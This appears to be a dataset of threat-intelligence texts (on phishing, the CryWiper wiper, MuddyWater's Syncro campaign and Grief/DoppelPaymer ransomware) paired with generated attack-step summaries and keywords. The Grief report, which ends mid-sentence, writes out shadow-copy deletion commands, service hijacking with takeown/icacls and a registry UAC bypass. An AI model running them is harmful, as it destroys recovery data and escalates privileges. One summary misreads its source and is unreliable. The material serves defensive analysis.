1. Conduct background research on targets. 2. Craft spearphishing emails with fake alerts or file sharing links. 3. Embed hidden tracking pixels to monitor when emails are opened. 4. Link emails to phishing sites mimicking Google, Yahoo, etc. 5. Prompt targets to enter credentials and verification codes into phishing pages. 6. Check credentials in real-time on attacker infrastructure. 7. Remain undetected by not changing account passwords in some cases. 8. Use VPNs, proxies, and hosting providers to obscure infrastructure. 9. Continuously set up new phishing domains for ongoing campaigns. ",valid_28,"['targets', 'phishing emails', 'fake alerts', 'Embed', 'sites', 'Google', 'Yahoo', 'credentials', 'verification codes', 'phishing pages', 'time', 'attack', 'Remain', 'account', 'passwords', 'some cases', 'US', 'VPNs', 'proxies', 'phishing domains']",targets; phishing emails; fake alerts; Embed; sites; Google; Yahoo; credentials; verification codes; phishing pages; time; attack; Remain; account; passwords; some cases; US; VPNs; proxies; phishing domains.
"www.bleepingcomputer.com /news/security/new-crywiper-data-wiper-targets-russian-courts-mayor-s-offices/ New CryWiper data wiper targets Russian courts, mayor’s offices Bill Toulas ⋮ ⋮ 12/2/2022A previously undocumented data wiper named CryWiper is masquerading as ransomware, but in reality, destroys data beyond recovery in attacks against Russian mayor's offices and courts.CryWiper was first discovered by Kaspersky this fall, where they say the malware was used in an attack against a Russian organization.""In the fall of 2022, our solutions detected attempts by a previously unknown Trojan, which we named CryWiper, to attack an organization's network in the Russian Federation,"" explains the new report by Kaspersky.However, a report by by Russian media says that the malware was used in attacks against Russian mayor's offices and courts.As the code analysis reveals, the data-wiping function of CryWiper isn't a mistake but a purposeful tactic to destroy targets' data. Wiping the victim's dataCryWiper is a 64-bit Windows executable named 'browserupdate.exe' written in C++, configured to abuse many WinAPI function calls.Upon execution, it creates scheduled tasks to run every five minutes on the compromised machine.Creation of scheduled task (Kaspersky)Next, it contacts a command and control server (C2) with the name of the victim's machine. The C2 responds with either a ""run"" or ""do not run"" command, determining whether the wiper will activate or stay dormant.Kaspersky reports seeing execution delays of 4 days (345,600 seconds) in some cases, likely added in the code to help confuse the victim as to what caused the infection.CryWiper will stop critical processes related to MySQL, MS SQL database servers, MS Exchange email servers, and MS Active Directory web services to free locked data for destruction.1/2Services killed by CryWiper (Kaspersky)Next, the malware deletes shadow copies on the compromised machine to prevent the easy restoration of the wiped files.CryWiper also modifies the Windows Registry to prevent RDP connections, likely to hinder intervention and incident response from remote IT specialists.Finally, the wiper will corrupt all enumerated files except for "".exe"", "".dll"", ""lnk"", "".sys"", "".msi"", and its own "".CRY"", while also skipping System, Windows, and Boot directories to prevent rendering the computer completely unusable.The algorithm for corrupting the files is based on ""Mersenne Twister,"" a pseudorandom number generator. This is the same algorithm used by IsaacWiper, but the researchers established no further connection between the two families.After this step, CryWiper will generate ransom notes named 'README.txt,' asking for 0.5 Bitcoin (approximately $8,000) in exchange for a decrypter. Unfortunately, this is a false promise, as the corrupted data cannot be restored.Ransom note generated by CryWiper (Kaspersky)Even though CryWiper is not ransomware in the typical sense, it can still cause severe data destruction and business interruption.Kaspersky says CryWiper does not seem to be associated with any wiper families emerging in 2022, like DoubleZero, IsaacWiper, HermeticWiper, CaddyWiper, WhisperGate, AcidRain, and Industroyer2.Update 11/2/2: Added further information about CryWiper targets (h/t Risky Biz).2/2 ","1. CryWiper malware is executed on the victim's system, likely via an initial compromise vector like phishing. 2. CryWiper creates scheduled tasks to repeatedly execute itself every 5 minutes. 3. CryWiper contacts a command and control server which can remotely trigger the data wiping process. 4. CryWiper stops critical services related to databases, email servers, and Active Directory. 5. Shadow copies are deleted to prevent easy restoration of files. 6. The Windows registry is modified to block RDP connections. 7. CryWiper corrupts files on the system using an algorithm called Mersenne Twister while avoiding critical directories. 8. A fake ransom note is generated demanding Bitcoin payment in exchange for decryption, even though recovery of files is not possible. 9. The wiping process is repeated via the scheduled tasks, destroying data on the compromised system. 10. The attack results in permanent data loss and disruption for the victim organization. ",valid_56,"['CryWiper', 'the victim', 'System', 'scheduled tasks', 'a command and control server', 'data', 'email servers', 'Active Directory', 'Shadow copies', 'easy restoration', 'files', 'The Windows registry', 'RDP connections', 'Mersenne Twister', 'Ransom note', 'Bitcoin', 'exchange', 'recovery']",CryWiper; the victim; System; scheduled tasks; a command and control server; data; email servers; Active Directory; Shadow copies; easy restoration; files; The Windows registry; RDP connections; Mersenne Twister; Ransom note; Bitcoin; exchange; recovery.
"www.deepinstinct.com /blog/new-muddywater-threat-old-kitten-new-tricks New MuddyWater Threat: Old Kitten; New Tricks ⋮ 12/8/2022MuddyWater, also known as Static Kitten and Mercury, is a cyber espionage group that’s most likely a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).Since at least 2017 MuddyWater has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.MuddyWater has various campaigns that are entirely different from each other. In this post we will focus on the most recent changes and observations of their campaign which utilizes spearphishing with legitimate remote administration tools.Executive summary:Deep Instinct’s Threat Research team has identified a new campaign of the MuddyWater group. The campaign has been observed targeting Armenia, Azerbaijan, Egypt, Iraq, Israel, Jordan, Oman, Qatar, Tajikistan, and United Arab Emirates. The campaign exhibits updated TTPs to previously reported MuddyWater activity.Figure 1: Campaign overviewMuddyWater Exploiting Legitimate ToolsPrevious research has shown that in 2020 MuddyWater sent spearphishing emails with direct links as well as PDF and RTF attachments containing links to archives hosted at “ws.onehub.com.”Those archives contained the installer for “RemoteUtilities,” a legitimate remote administration tool.Since the beginning of 2021, MuddyWater has been observed sending spearphishing emails containing either direct links or Word documents with links to archives hosted at “ws.onehub.com.”The archives from 2021 contained installers for ScreenConnect, another legitimate remote administration tool.1/8This activity was observed intermittently through the end of 2021 and until July 2022.In July 2022 a potential file related to this campaign was observed, but it contained Atera Agent instead of the usual ScreenConnect, potentially signaling the threat actor switched to another remote administration tool to avoid detection of their long running campaign.A new discovery: The current MuddyWater campaignThe most recent MuddyWater campaign was observed by Deep Instinct in the beginning of October and possibly started in the September timeframe.What makes this campaign different from previous waves is the use of a new remote administration tool named “Syncro.”A new lure in the form of an HTML attachment was observed, along with the addition of other providers for hosting the archives containing the installers of the remote administration tool.The previous July sample with ScreenConnect mentioned earlier, was named “promotion.msi.”In the current campaign there was a sample that had few names; one of them was also “promotion.msi.”The above ScreenConnect sample was communicating with “instance-q927ui-relay.screenconnect.com.” This instance was communicating with another MuddyWater MSI installer named “Ertiqa.msi” which is a name of a Saudi organization.In the current wave, MuddyWater used the same name “Ertiqa.msi,” but with Syncro installer.The target geolocations and sectors also align with previous targets of MuddyWater. Combined, these indicators provide us with enough proof to confirm that this is the MuddyWater threat group.EXAMPLE #1: Egyptian Hosting CompanyDirect links to Dropbox:Figure 2: Email containing direct link to DropboxThis mail was sent from an Egyptian data hosting company, unlike previous campaigns using OneHub. This time MuddyWater used Dropbox to host the archive with the Syncro installer:Figure 3: Zip archive hosted on Dropbox containing MSI installer for SyncroHTML attachment leading to OneDrive:2/8Figure 4: Email containing HTML attachmentOn the same date the email with the Dropbox link was sent, MuddyWater sent another email from the same address of an Egyptian hosting company to another Egyptian hosting company.Instead of embedding a direct link in the email message, an HTML attachment was sent. This is a well-known technique to build trust. The receiving end knows the company who sent the mail. The attachment is not an archive or an executable which doesn’t raise end-user suspicion because HTML is mostly overlooked in phishing awareness trainings and simulations.HTML is considered “safer,” at least from an anti-virus (AV) and email security solutions point of view. Although those solutions have the ability to scan HTML, they are often still delivered to the recipients and not blocked.The HTML itself is very small; its main function is most likely to bypass email solutions that replace any link with “safe” link.Figure 5: HTML attachment containing link to OneDriveThe link inside the HTML file leads to OneDrive this time, hosting an archive containing Syncro MSI installer.EXAMPLE #2: Israeli Hospitality IndustryIn another example from early November, MuddyWater sent an email from a company in the Israeli hospitality industry to a wide number of contacts across different Israeli insurance companies:Figure 6: Email containing HTML attachmentIn this mail the company from the hospitality industry is looking for insurance.3/8The text is written in Hebrew, but a native speaker will find it suspicious due to a poor choice of words.Once again, the link leads to an archive hosted on OneDrive which contain Syncro MSI installer:Figure 7: HTML attachment containing link to OneDriveDespite those new TTPs, most of the Syncro installers are still hosted in OneHub:Figure 8: Archive hosted on OneHub containing Syncro MSI installerWhat is unclear is whether or not MuddyWater gained full access to the email server or only the credentials to one email box. The emails are sent from legitimate corporate accounts. We see that in spite of the low level of sophistication that this tactic can be effective.Syncro: A tool used by multiple threat actorsMuddyWater is not the only actor abusing Syncro. It has also been observed recently in BatLoader and Luna Moth campaigns.Syncro is a fully-featured platform for Managed Service Provider’s (MSPs) to run their business.4/8Figure 9: Sycnro Installer inside the MSISyncro provides an agent for MSPs to manage any device that has Syncro installed with the custom-made provided MSI file that includes the customerID.Figure 10: Syncro installation process with the customerID and ApiKeySyncro has a 21-day trial offer. You choose the subdomain to be used by your MSP:5/8Figure 11: Syncro trial sign-up screen with choice of syncromsp.com subdomainWhile investigating some of the installers that MuddyWater used, we see that for each unique mail a new MSI was used. In most cases MuddyWater used a single subdomain with a single MSI installer.It seems that most of the subdomains don’t have any useful meaning, although a few are clear:mohammadosman6060 and osmandembele4040 are football players netanyahu8585 and benet5050 are the current and former prime ministers of Israel Cham Wings is the name of a Syrian airlineThe trial version contains the fully featured web GUI which allows complete control over a computer with the Syncro agent installed:Figure 12: Web GUI of Syncro with available remote administration featuresThose features are standard for remote administration tools, such as terminal with SYSTEM privileges, remote desktop access, full file system access, tasks, and services manager.All those features combined with a signed MSI installer creates the perfect weapon for a threat actor to gain initial access and start performing recon on the target. Later, they enable the threat actors to deploy additional backdoors, exfiltrate files, or hand-off access to other threat actors. A threat actor that has access to a corporate machine via such capabilities has nearly limitless options.Recommendations:6/8We have recently described other dual-use tools that are being abused for malicious purposes. We recommend that security teams monitor for remote desktop solutions that are not common in the organization as they have a higher chance of being abused.MITRE ATT&CK:TacticTechniqueDescriptionObservableInitial AccessInitial AccessT1566.001 and ControlT1219 Remote Access SoftwareResource DevelopmentT1588.002 Obtain Web ServicesIOC:MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients. MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails containing links to legitimate domains hosting archives with remote management software. MuddyWater has used a legitimate application, Syncro, to manage systems remotely and move laterally. MuddyWater has used a legitimate application, Syncro, to manage systems remotely and move laterally. MuddyWater has used file sharing services including OneHub, Dropbox, and OneDrive to 47b4-8717-40dc09b4ea09/ - archived scan of a Dropbox URL containing an archive with Syncro ","1. MuddyWater sends phishing emails containing links or HTML attachments. 2. The links and attachments lead to archives hosted on services like OneHub, Dropbox, and OneDrive. 3. The archives contain installers for remote administration tools like ScreenConnect and Syncro. 4. Victims are tricked into installing the tools, enabling MuddyWater persistent access. 5. MuddyWater sets up new Syncro instances and subdomains for each phishing campaign. 6. Full control of compromised systems is achieved through Syncro including data exfiltration. 7. Additional payloads can be deployed using the remote access. 8. Targets include organizations in the Middle East, Asia, Africa, Europe, and North America. 9. Phishing lures impersonate legitimate companies relevant to the target. 10. Poor grammar and formatting evades detection as a phishing attempt. ",valid_94,"['MuddyWater', 'phishing emails', 'links', 'HTML attachment', 'attachments', 'the link', 'services', 'OneHub', 'Dropbox', 'OneDrive', 'the archives', 'installers', 'remote administration tools', 'ScreenConnect', 'Syncro', 'access', 'subdomains', 'systems', 'us', 'Targets', 'organizations', 'the Middle East', 'Asia', 'Africa', 'Europe', 'North America', 'the target', '10', 'detection']",MuddyWater; phishing emails; links; HTML attachment; attachments; the link; services; OneHub; Dropbox; OneDrive; the archives; installers; remote administration tools; ScreenConnect; Syncro; access; subdomains; systems; us; Targets; organizations; the Middle East; Asia; Africa; Europe; North America; the target; 10; detection.
"CONTENTS2INTRODUCTIONThe ransomware industry has continued to evolve during the past couple of years. And it is still a growing problem in 2021, as ransom demands become larger, attackers smarter, and intrusions longer. Ransomware threat actors are hitting U.S. and global companies harder with more effective ransomware deployments resulting in a more devastating impact to victim organizations. Most ransomware operators are now conducting full-scale network intrusions such as the one recently done by an Advanced Persistent Threat (APT). When they strike, they deploy ransomware across the entirety of victim organizations, often with devastating consequences, and their deployments are more complete and more effective.One ransomware variant that we have been tracking is called Grief ransomware, which is the latest version of DoppelPaymer ransomware and previously known as BitPaymer ransomware. This ransomware has gained a lot of popularity recently due to its continuous improvement and its large number of victims in the U.S. and global companies.Another reason we focused on this particular ransomware is that it shares the same code with several other identified ransomware such as WastedLocker and Macaw, and with Dridex (downloader malware). This indicates that Grief was very likely created by the same team that created Dridex, which, according to the U.S. Treasury, is Evil Corp, also known as Indrik Spider and TA505. The Treasury also mentioned in a recent report that Evil Corp is led by Maksim Yakubets who has worked for the Russian Federal Security Service (FSB), including on projects intended to “acquire confidential documents through cyber-enabled means.”1 Yakubets is also on the FBI’s Most Wanted list.So Grief, being a product of Evil Corp, probably launched and transitioned to the Grief brand so Evil Corp could evade authorities and prevent organizations from realizing they are breaking OFAC sanctions by paying them2. It should be noted that this isn’t the first time Evil Corp had rebranded its malware in an apparent attempt to evade sanctions.In this report we will dive deep and explore Grief operation and development since it was first observed in July 2017 as BitPaymer, as well as compare the different variants and partnerships with other threat actors and ransomware groups.AMER ELSAD Threat Intelligence AnalystAmer Elsad serves as a Threat Intelligence Analyst II in the Threat Resistance Unit for Armor, where he focuses on Adversary Tracking, including their behaviors, objectives, campaigns, and tactics, techniques, and procedures (TTPs). Elsad is also responsible for evaluating customer telemetry and analyzing intrusion activity by advanced attackers. Prior to joining Armor, he worked in both private and government domains, and has broad experience in threat intelligence, threat hunting, and malware analysis. Elsad holds a bachelor’s degree in Information Systems from Alexandria University.3WHAT IS GRIEF, PREVIOUSLY KNOWN AS DOPPELPAYMER?Grief is a ransomware-as-a-service (RaaS) operation, which refers to a business model where operators develop crypto-locking malware. Affiliates then use the malware to infect victims—with both operators and affiliates sharing the profits.Grief emerged in May 2021 and was considered a new operation at first. But later it was discovered that the Grief gang carries many similarities to the DoppelPaymer variant. This led to the conclusion that Grief ransomware is, in fact, the latest version of DoppelPaymer ransomware with just minor code changes and a new cosmetic theme. The threat group behind it also has been very active since the release of Grief.Grief and DoppelPaymer ransomware were both developed by Doppel Spider, a threat actor affiliated with Evil Corp and first discovered by CrowdStrike. This variant has several technical overlaps with Doppel Spider’s multi-toolset that provides a definitive link to the adversary, such as DoppelPaymer, BitPaymer, and Dridex.According to its report on Doppel Spider, CrowdStrike has assessed with high confidence that a new group likely has split off from Indrik Spider a.k.a. Evil Corp3. Furthermore, Grief’s operator has a dedicated data leak site reachable only via the anonymizing Tor browser.RANSOMWARE TIMELINE & CONNECTION2014DRIDEXJULY 2017BITPAYMERAPRIL 2019DOPPELPAYMERMAY 2021GRIEFDeveloped by Indrik SpiderPossibly developedby Indrik SpiderDeveloped by Doppel Spider(Believed to be Indrik Spider former personnel)All use the same botnet for distribution and obfuscator with near-identical decryptors not used by any other malware family.Use similar code.Use same encryption algorithm, import hashing,and entry point offset calculation.4SIMILARITIES BETWEEN GRIEF & DOPPELPAYMER & EVIDENCE SUPPORTING THEY ARE THE SAME OPERATIONIn early May 2021, DoppelPaymer ransomware activity dropped significantly, and there has not been a new victim post since May 6, 2021. In addition, no victim posts have been updated since the end of June, and no files have been leaked since June 25. However, the operation appears to have been rebranded under the name Grief (a.k.a. Pay OR Grief) by its operator, Evil Corp, in an attempt to avoid sanctions imposed on the crime group in December 2019 by the U.S. Treasury Department’s Office of Foreign Assets Control.1Despite the threat actor’s effort to make Grief look like a separate RaaS, the similarities to DoppelPaymer are so striking, in our opinion, that a connection between the two is impossible to dismiss. There is so little setting the two apart, and it’s mostly cosmetic. We strongly believe that it’s the same operation under a different name.SIMILARITIESDIFFERENCES When Grief was first spotted in the wild, DoppelPaymer and Grief showed to encrypt files in the same manner: “identical encryption algorithms (2048-bit RSA and 256-bit AES), import hashing, and entry point offset calculation.” Both also have used the Dridex botnet for distribution. Grief’s ransomware executable was first compiled on May 17 and included Grief’s crypto-locking code and note, but it directed victims to DoppelPaymer’s payment portal. Both Grief and DoppelPaymer use the European Union’sGeneral Data Protection Regulation (GDPR) as a warning that non-paying victims would still have to face legal penalties due to the breach. One change from DoppelPaymer is that the grouppreviously demanded payment in bitcoin, and now Grief wants victims to pay in monero (a more privacy-preserving cryptocurrency). That may be because the FBI was able to successfully recover some of the bitcoin Colonial Pipeline paid to DarkSide. Unlike DoppelPaymer, Grief malware samples have the ProcessHacker binaries removed. But it uses the same code to decrypt data from binary’s data section. Grief’s string encryption algorithm is the same asDoppelPaymer, i.e., 2048-bit RSA and 256-bit AES, except the RC4 key length that was increased to 48 bytes from 40 bytes.5THE DIFFERENCES SEEM TO BE MOSTLY COSMETICBoth ransomware leak sites are nearly identical, including shared code that displays a captcha to prevent automated crawling as shown in Figure 1 and Figure 2.Figure 1. Grief ransomware (left) and DoppelPaymer (right) captcha (Source: zscaler)The victim-specific leak page layouts are also identical as shown below in Figure 2 containing the victim’s URL, organizational description, images of stolen data, example stolen data files, and a list of machines that were compromised.Figure 2. Grief ransomware (left) and DoppelPaymer (right) victim leak pages (Source: zscaler)6SIMILARITIES BETWEEN BITPAYMER & DOPPELPAYMERDoppelPaymer was considered to be based on the BitPaymer ransomware (which first emerged in 2017) due to the connections in their code, ransom notes, and payment portals. In July 2019, CrowdStrike highlighted some similarities between BitPaymer and DoppelPaymer, speculating that DoppelPaymer appears to be the work of the former BitPaymer group members but is a bit more complex.3BitPaymer, also known as FriedEx or IEncrypt, was initially dubbed BitPaymer based on text in its ransom demand web site. This ransomware was discovered in early July 2017 by Michael Gillespie and in use since at least July 2017.4 It is manually operated and used against private and public entities in targeted attacks. Research from ESET showed BitPaymer and Dridex are sharing multiple technical similarities.SIMILARITIES BitPaymer ransomware contains the same referenced string between Dridex and DoppelPaymer aimed to act as an anti- Windows Defender emulator checking the existence of the file, “C:\aaa_TouchMeNot_.txt,” which is indicative of Windows Defender sandbox activity. DoppelPaymer ransomware contains a peculiar string reused across samples from BitPaymer and Dridex as shown below inFigure 3. It copies the unicode string “setup runn” to eax via lstrcpyW API call. discovered by SentinelOne.5Figure 3. Code reuse between Dridex (left), BitPaymer (center), and DoppelPaymer (right). (Source: Sentinelone).7DIFFERENCES DoppelPaymer uses 2048-bit RSA + 256-bit AES for encryption, while BitPaymer uses 4096-bit RSA + 256-bit AES (with olderversions using 1024-bit RSA + 128-bit RC4). Furthermore, DoppelPaymer improves upon BitPaymer’s rate of encryption by using threaded file encryption. ESET discovered a second variant dubbed FriedEx, which focuses on higher profile targets and companies rather than regular end users, and is usually delivered via an RDP brute force attack.6 The ransomware encrypts each file with a randomly generated RC4 key, which is then encrypted using a hardcoded 1024-bit RSA public key and saved in the corresponding. readme_txt file.DOPPELPAYMER & BITPAYMER SIMILARITIES WITH DRIDEXThe Dridex banking trojan first appeared in 2014 as a relatively simple bot inspired by older projects, but quickly turned into one of the most sophisticated banking trojans on the market. The development seems to be steady, with new versions of the bot, including minor fixes and updates, being released on a weekly basis with occasional breaks. From time to time, the authors introduce a major update that adds some crucial functionality or larger changes.SIMILARITIES It should be noted that all the ransomware variants we mentioned above are deployed via Dridex. They all use the same customobfuscator as Dridex—which is an obfuscator not used by any other malware families—and they all have near-identical decryptors. As we mentioned above, DoppelPaymer was derived from BitPaymer. It was discovered later by CrowdStrike that some Evil Corppersonnel that developed Dridex separated into a threat group called Doppel Spider and attempted an attack using DoppelPaymer. It is also known that the same group developed DoppelDridex, known as Dridex 2.0 version. The overall information can be seen in CERT-FR’s CTI report.7 A Dridex loader sample was distributed through the Emotet malware on June 4, 2019. The Dridex sample contained code to decrypteither a 32-bit or a 64-bit core bot module from its sdata section using the exact same encryption, compression, and data format that DoppelPaymer uses to extract PEs from its sdata section. This observation ties this Dridex variant directly with DoppelPaymer. BitPaymer uses the same techniques as Dridex to hide as much information as possible about its behavior. It resolves all system API calls on the fly by searching for them by hash, stores all strings in encrypted form, looks up registry keysand values by hash, etc. Analysis results of CrowdStrike show that Dridex malware and BitPaymer ransomware were found in identical incidents, whichstrengthens the fact that it must be the same developing group.88As per Figure 4, part of a function used for generating UserID was found across all Dridex binaries (both loaders and bot modules). The very same Dridex-specific function is also used in the BitPaymer binaries. The function produces the same results—it generates a string from several attributes of the victim’s machine that serves as a unique identifier of the given victim.This kind of similarity to Dridex is present throughout the BitPaymer a.k.a. FriedEx binaries, and only very few functions that correspond to the specific ransomware functionality are not found in the Dridex sample (i.e., the file encryption loop and creation of ransom message files).As we can see in Figure 5, another shared feature is the order of the functions in the binaries, which occurs when the same codebase or static library is used in multiple projects. While the BitPaymer sample seems to be missing some of the functions present in the Dridex sample and vice versa—which is caused by the compiler omitting unreferenced/unused functions—the order remains the same.Note: (sub_CA5191 and sub_2A56A2, etc.) are auto-generated function name pairs. Based on code addresses, they do not match, but the code they refer to does.Figure 4. Comparison of GetUserID function present in both Dridex (left) and BitPaymer (right) samples. (Source: ESET)Figure 5. Comparison of function order in Dridex (left) and BitPaymer (right) samples. Functions that are missing in the other sample are highlighted in the corresponding color. (Source: ESET)9CONNECTIONS WITH OTHER RANSOMWARE GROUPS — WHO IS THE OPERATOR OF THE RANSOMWARE?Blockchain analysis by Insights shows a connection between five of 2020’s biggest ransomware strains: Maze, Egregor, SunCrypt, wastedLocker, and DoppelPaymer.9 Insights has pointed out that many RaaS affiliates carrying out attacks switch between different strains, and research also reveals that seemingly distinct strains are likely controlled by the same people.CONNECTION BETWEEN FOUR OF 2020’S BIGGEST RANSOMWARE STRAINSEVIL CORPINDRIK SPIDERDOPPEL SPIDERWastedLockerBitPaymerDridexTinyPosTinyLoaderDoppelPaymerToolCase 1C:\WindowsSame .bat scriptMimikatzPsExecProcdumpCurrently, Evil Corp is mainly used to refer to Indrik Spider, and it attempts to attack using WastedLocker instead of the BitPaymer. It is also believed that Doppel Spider is a group that has split off from Indrik Spider. However, we can assume close relation between the two organizations by the above-mentioned facts.10SPLIT WITHIN EVIL CORPIn April 2019, Evil Corp is thought to have split into two groups: Indrik Spider and Doppel Spider. While Indrik Spider allegedly ran the malware Dridex and BitPaymer, as had been done since 2018, Doppel Spider purportedly executed a modified version of Dridex, DoppelDridex, and a variant of the ransomware BitPaymer—DoppelPaymer. In this way, it not only deployed banking fraud campaigns via DoppelDridex, but also ransomware campaigns via DoppelPaymer.GIVEN THAT: The malware FakeUpdates distributed Dridex in October 2019, and that Dridexdeployed either BitPaymer or DoppelPaymer within the victims’ Integrated Security Systems (ISS). During a DoppelPaymer incident, FireEye detected the downloading of Dridexv4 botnet ID 501 (associated with Evil Corp), and then of Dridex v2 botnet ID 12333 in a bid to deploy DoppelPaymer (associated with Doppel Spider). Doppel Spider uses the services of Emotet, as does Evil Corp. It would appear that the two groups are continuing to collaborate, or perhaps even that Doppel Spider is a subgroup of Evil Corp. However, since the first quarter of 2020, what distinguishes the operatorsbehind DoppelPaymer from BitPaymer’s operators is that those of the former have started to publish the data exfiltrated from the IS of their victims (on the website www.doppleshare[.]top/) in the same way as operators of other ransomware (Maze, Sodinokibi, Clop, and Nemty, in particular).HISTORY OF PARTNERSHIP WITH OTHER THREAT ACTORS & MALWARE FAMILIESPARTNERSHIP WITH QAKBOTDuring 2020, Mandiant observed multiple DoppelPaymer ransomware deployments where initial access was achieved through widespread use of QakBot malware.10 In contrast to REvil’s affiliate model where individual threat actors are responsible for end- to-end intrusions from initial access to ransomware deployment, QakBot and DoppelPaymer employ a partnership model where one threat actor is responsible for initial access, privilege escalation, and lateral movement, and then it is passed to another threat actor for ransomware deployment of Dridex, DoppelDridex, and a variant of the ransomware BitPaymer—DoppelPaymer. In this way, it not only deployed banking fraud campaigns via DoppelDridex, but also ransomware campaigns via DoppelPaymer.11PARTNERSHIP WITH LOCKEAN THREAT ACTORA comprehensive report published by France’s Computer Emergency Response Team (CERT-FR), a division of ANSSI, the country’s national cybersecurity agency, investigated a threat actor dubbed Lockean, and it is believed they may also be a DoppelPaymer affiliate for the following reasons:11 Strains of the DoppelPaymer ransomware were also distributed from the same IP address that Lockean has used in their campaigns, such as Maze ransomware, according to a code analysis platform done by Cert-FR. In DoppelPaymer incidents observed by Cer-FR at Fareva, the ransomwarestrain was named “k166sm.exe,” which matches the naming convention used such, it is possible that it was involved in the incident at Fareva. Akamai typosquatting Cobalt Strike C2s (« atakai-technologies.host », «akamai-technologies.site » and « akamai-technologies.space ») were found in incidents leading to encryption by DoppelPaymer, thereby supplementing the ANSSI’s observations about the DoppelPaymer incidents at Company A and Fareva. DoppelPaymer was already distributed by QakBot. The renaming of QakBot as « md.exe », specific to the « domain » affiliate and therefore to Lockean, was found during the DoppelPaymer incident at Company A in June 2020.PARTNERSHIP WITH TINYLOADERAccording to Talos’ report released in November 2019, DoppelPaymer, TinyPoS, SVCHOST SAMPLE, etc., were distributed from the same server used for TinyLoader.12 SVCHOST SAMPLE also was identical to TinyLoader. That is, TinyLoader, TinyPoS, and DoppelPaymer were distributed together from one server.12TACTICS, TECHNIQUES, & PROCEDURES (TTPs)Many ransomware families are being distributed through RaaS programs, and since each has multiple affiliates, there may be shifts in TTPs used by threat actors. Some ransomware (e.g., REvil, Netwalker, and DarkSide) were public. DoppelPaymer and Grief were not, and their TTPs shifts were minimal.We looked into all previous variants and campaigns of the ransomware and its operator Doppel Spider to try to identify patterns as well as the use of TTPs and common tools to help us better defend and predict what the attacker will be using in their attacks. We noticed that they have shifted and used a combination of TTPs and other post exploitation tools similar with other ransomware, including some living off the land techniques such as alternate data streams (ADS), which we discussed in our previous blog.Based on our research, we have put together a combination of the TTPs we have observed the attacker using for their campaigns.Since Dridex is likely to download Grief/DoppelPaymer ransomware as a second payload, it is also worth focusing detection efforts on that. We suggest reading these great resource and analysis of Dridex: “The Malware Dridex: Origins and Uses”7 and “New Dridex Variant Being Spread By Crafted Excel Document.”13DISTRIBUTION & INITIAL ACCESS We’ve observed the ransomware being distributed through multiple methods, which confirms ourtheory that Grief/DoppelPaymer is sold on black markets as a RaaS (ransomware-as-a-service) and used by different threat actors, designated as “affiliates.” But all of them tend to favor malicious email attachments as the initial vector for infiltrating avictim’s network. This is typically done using highly targeted spear-phishing emails that make victims more likely to open attachments under the guise that the emails come from a trusted source. The attachment includes either JavaScript or VBScript, which is responsible for downloading other malware with more advanced capabilities (such as Emotet) into the victim’s system.EXECUTION Once Emotet is downloaded, it will communicate with command-and-control (C&C) to downloadand execute Dridex malware, which in turn is used to download either Grief directly or tools such as PowerShell Empire, Cobalt Strike, PsExec, and Mimikatz, to steal credentials, move laterally, or execute different commands, such as disabling security software. Once Dridex enters the system, these threat actors do not immediately deploy the ransomware. Instead, they will try to move laterally within the affected system’s network to find a high-value target to steal critical information from. That’s because the success of attacks relies on whether campaign operators manage to gain control over domain accounts with elevated privileges after establishing initial access.13RECONNAISSANCE After obtaining adequate credentials, attackers perform extensive reconnaissance of machines andrunning software to identify targets for ransomware delivery. They use the built-in command qwinsta to check for active RDP sessions, run tools that query Active Directory or LDAP, and ping multiple machines. In some cases, the attackers target machines that are running systems management software.LATERAL MOVEMENT AND ELEVATING PRIVILEGES It has been reported that threat actors propagated manually for approximately one week within the victim’s network before the ransomware deployment. To perform the propagation, they first sought to compromise network administrators accounts to take control of central servers, such as Active Directory. These accounts serve also to identify critical resources within the network (file system storage, data backup, production-related equipment, etc.). Use of group policies, binaries placed in SYSVOL locations and deployed across the domain usingscripts, has been reported:— PsExec — BITS Jobs — Scheduled Tasks Attackers utilize various methods to gain access to privileged accounts, including common credential theft tools such as Mimikatz and LaZagne. They have also been observed using Sysinternals tool ProcDump to obtain credentials from LSASS process memory. They have even used LSASecretsView to access credentials stored in the LSA secrets portion of the registry, which is accessible to local admins (this portion of the registry can reveal credentials for domain accounts used to run scheduled tasks and services).14 They have used a technique introduced by @enigma0x3 (See Figure 6), which is Fileless UAC bypass14. It changes the registry key - ‘HKCR\mscfile\shell\open\command’ default value to point at the ‘.cmd’ file, which will cause Grief to run with high privileges without a UAC prompt. If it fails in elevating its privileges, it will exit without encrypting the file system. The abuse of eventvwr.exe and similar types of registry hijack elevation techniques are a serious architecture weakness and are very popular among malware. It is also easy to tweak the technique to bypass any existing detection solution. When running with high privileges, Grief deletes shadow copy files from the host. It does this by running the command ‘vssadmin.exe Delete Shadows /All /Quiet’ and ‘diskshadow.exe /s %TEMP%\<tempfile>. tmp’ (<tempfile>.tmp = “delete shadows all\r\nexit\r\n”) for Windows Server versions. Next, it tries to take ownership of a random service by using ‘takeown.exe /F <service_name>’ and‘icacls.exe <service_name> /reset’ . It then replaces the service with a copy of its own and executes Grief as a service. After successfully hijacking and running from a service, it begins to encrypt the file system. It has been reported that Grief, in some cases, will not destroy shadow copies (T1490 Inhibit SystemRecovery). Its reason could be that the operator will want to delete shadow copies manually.Figure 6: Compromised registry key (Source: Morphisec)PERSISTENCE The threat actor has been observed adjusting a legitimate Windows Service configuration to run themalware. Grief chooses a legitimate Windows Service and replaces the ImagePath registry value of the service’s configuration to execute the ransomware again at the next boot (T1543.003 Create or Modify System Process: Windows Service)15. It guarantees that the next time the system begins, Grief operates again and returns the system to safe mode.— File: <random>.exe — Path: %APPDATA%\<random>.exe — Note: Copy of Grief binary — Service: <random_service> — Path: %WINDIR%\system32\<random_service>.exe — Note: Ransomware Service — Service: <random_service>-1 — Path: %WINDIR%\system32\<random_service>.exe-1 — Note: Backup of Service15DEFENSE EVASION The threat actors have used NTFS file attributes T1564.004 to hide their malicious payloads.16 They used an anti-Windows Defender emulator checking the existence of the file “C:aaa_TouchMeNot_. txt,” which is indicative of Windows Defender sandbox activity that checks if it is running as an alternate data stream (See Figure 7). It does that by checking if the name of the file on the disk ends with:Figure 7: Check if running from alternate data stream (Source: Morphisec) If not, it will copy itself to a hidden alternate data stream under “%APPDATA%\<random_name>:BIN”and create a new process with the old file path as a parameter. The alternate data stream process then performs the following:— Deletes the original file — Copies itself from 